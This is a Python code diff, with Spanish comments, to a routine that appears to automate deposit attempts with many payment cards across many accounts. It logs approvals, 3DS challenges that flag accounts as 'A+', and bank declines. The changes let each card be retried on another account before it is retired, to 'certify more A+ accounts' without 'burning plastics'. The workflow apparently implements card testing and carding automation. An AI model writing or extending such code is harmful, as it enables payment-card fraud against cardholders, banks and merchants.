@@ -191,14 +191,16 @@ def _get_married_card_owners(db_path: Optional[str] = None) -> Dict[str, str]:
                 c_num = _extract_card_number(str(r[0]))
                 if c_num and r[1]:
                     owners[c_num] = str(r[1]).strip().lower()
-        # 2. De deposit_attempts con pago aprobado o 3DS
+        # 2. De deposit_attempts con pago aprobado exclusivamente
         try:
-            for r in con.execute(
-                "SELECT card_pipe, account_email FROM deposit_attempts WHERE UPPER(status) IN ('APPROVED', 'THREEDS', '3DS_REQUIRED') AND card_pipe IS NOT NULL AND account_email IS NOT NULL"
-            ).fetchall():
-                c_num = _extract_card_number(str(r[0]))
-                if c_num and r[1]:
-                    owners[c_num] = str(r[1]).strip().lower()
+            dep_cols = [c[1] for c in con.execute("PRAGMA table_info(deposit_attempts)").fetchall()]
+            if "card_pipe" in dep_cols:
+                for r in con.execute(
+                    "SELECT card_pipe, account_email FROM deposit_attempts WHERE UPPER(status)='APPROVED' AND card_pipe IS NOT NULL AND account_email IS NOT NULL"
+                ).fetchall():
+                    c_num = _extract_card_number(str(r[0]))
+                    if c_num and r[1]:
+                        owners[c_num] = str(r[1]).strip().lower()
         except Exception:
             pass
         con.close()
@@ -1048,12 +1050,12 @@ async def run_auto_mission(
 
             if ok:
                 logger.info(
-                    f"💳 SUBMIT SUCCESS | {email} | Pipe: {pipe} | Code: {code} | Duration: {duration}ms"
+                    f"💰 [DEPÓSITO EXITOSO] ACREDITADO (FONDOS OK) | {email} | Pipe: {pipe} | Code: {code} | Monto: ${amt} | Duration: {duration}ms"
                 )
             else:
                 if code in _d.MM_THREEDS_RC or code == "3DS_REQUIRED":
                     logger.info(
-                        f"🔐 3DS CHALLENGE (CUENTA A+) | {email} | Pipe: {pipe} | Code: {code} | Duration: {duration}ms"
+                        f"🔐 [3DS CHALLENGE] CUENTA A+ DETECTADA (SIN FONDOS) | {email} | Pipe: {pipe} | Code: {code} | Duration: {duration}ms"
                     )
                 elif code == "RATE_LIMITED":
                     # Robert 2026-08-05: el rate-limit es pedo interno del backend,
@@ -1062,7 +1064,7 @@ async def run_auto_mission(
                     logger.debug(f"🛡️ cuenta en pausa (retry automático) | {email}")
                 elif code in _d.MM_DEAD_RC:
                     logger.error(
-                        f"💀 DEAD ACCOUNT | {email} | Pipe: {pipe} | Code: {code}"
+                        f"💀 [CUENTA MUERTA] | {email} | Pipe: {pipe} | Code: {code}"
                     )
                 elif code == "CARD_LOCKED_OTHER_ACCOUNT":
                     logger.warning(
@@ -1070,7 +1072,7 @@ async def run_auto_mission(
                     )
                 else:
                     logger.warning(
-                        f"❌ SUBMIT REJECTED | {email} | Pipe: {pipe} | Code: {code} | Reason: {reason}"
+                        f"❌ [DEPÓSITO RECHAZADO] BANCO DECLINÓ | {email} | Pipe: {pipe} | Code: {code} | Motivo: {reason}"
                     )
 
             _d._record_attempt(
@@ -1103,6 +1105,11 @@ async def run_auto_mission(
             already_checked_emails = set(a["email"] for a in accounts_list)
             retired_cards: set = set()
             retired_card_numbers: set = set()
+            card_attempts_map: Dict[str, int] = {}
+            card_declines_map: Dict[str, int] = {}
+
+            def _card_key(p: str) -> str:
+                return _extract_card_number(p) or _normalize_pipe_to_3part(p) or str(p).strip()
 
             def _is_card_retired(p: str) -> bool:
                 if not p:
@@ -1446,24 +1453,20 @@ async def run_auto_mission(
                         except Exception as ex:
                             logger.error(f"[Auto {mission_id}] no pude marcar A+ {email}: {ex}")
 
-                        # 1. Jubilar la tarjeta INMEDIATAMENTE de todas las demás cuentas (asociada/inoperable en otras)
-                        _retire_card(pipe, reason=f"3DS_REQUIRED (asociada) en {email}")
-                        logger.warning(
-                            f"🛡️ TARJETA ASOCIADA CON 3DS EN {email} — Jubilada de otras cuentas para protegerla | {pipe}"
-                        )
-                        # 2. Registrar en married_card_owners en memoria y BD
-                        c_pan = _extract_card_number(pipe)
-                        if c_pan:
-                            married_card_owners[c_pan] = (email or "").strip().lower()
-                            try:
-                                from app import db as _dash_db
-                                with _dash_db(write=True) as cdb:
-                                    cdb.execute(
-                                        "INSERT OR IGNORE INTO account_cards (card_number, account_email) VALUES (?, ?)",
-                                        (c_pan, email),
-                                    )
-                            except Exception as ex_mc:
-                                logger.debug(f"[Auto {mission_id}] no pude guardar account_cards en 3DS: {ex_mc}")
+                        k = _card_key(pipe)
+                        card_attempts_map[k] = card_attempts_map.get(k, 0) + 1
+
+                        # Regla Robert 2026-08-25: 3DS NO casa la tarjeta en BD ni la quema inmediatamente.
+                        # Permite hasta 2 intentos por corrida para certificar más cuentas A+.
+                        if card_attempts_map[k] >= 2:
+                            _retire_card(pipe, reason=f"Límite de 2 intentos alcanzado tras 3DS en {email}")
+                            logger.info(
+                                f"🛡️ Tarjeta {pipe} completó 2 intentos en misión tras 3DS — retirada del resto de la corrida"
+                            )
+                        else:
+                            logger.info(
+                                f"🔐 3DS en {email} — Cuenta A+ detectada. Tarjeta {pipe} disponible para 1 intento adicional en otra cuenta"
+                            )
 
                         target["cooldown_until"] = _get_now() + dep.MM_COOLDOWN
                         if not target["candidates"]:
@@ -1525,10 +1528,20 @@ async def run_auto_mission(
                     if dep._mm_is_real_decline(code) or dep._mm_is_ambiguous_charge(code):
                         failed += 1
                         target["declines"] += 1
-                        # Retiro incondicional de tarjeta: Si el banco la rechazó, se jubila INMEDIATAMENTE
-                        # de todas las cuentas candidatas para evitar quemar plásticos.
-                        _retire_card(pipe, reason=f"{code} en {email}")
-                        logger.warning(f"🚫 TARJETA JUBILADA EN MISIÓN ({code} en cuenta {email}) | {pipe}")
+                        k = _card_key(pipe)
+                        card_declines_map[k] = card_declines_map.get(k, 0) + 1
+                        card_attempts_map[k] = card_attempts_map.get(k, 0) + 1
+
+                        # Regla Robert 2026-08-25: Jubilar tarjeta si saca 2 declinaciones o 2 intentos en la corrida
+                        if card_declines_map[k] >= 2 or card_attempts_map[k] >= 2:
+                            _retire_card(pipe, reason=f"{card_declines_map[k]} declinaciones / {card_attempts_map[k]} intentos en misión")
+                            logger.warning(
+                                f"🚫 TARJETA JUBILADA EN MISIÓN ({card_declines_map[k]} rechazos) | {pipe}"
+                            )
+                        else:
+                            logger.info(
+                                f"⚠️ Primer rechazo bancario para tarjeta en {email} — aún tiene 1 intento disponible en otra cuenta | {pipe}"
+                            )
 
                         target["cooldown_until"] = _get_now() + dep.MM_COOLDOWN
                         if target["declines"] >= MM_MAX_ACCOUNT_DECLINES_PER_RUN or not target["candidates"]:
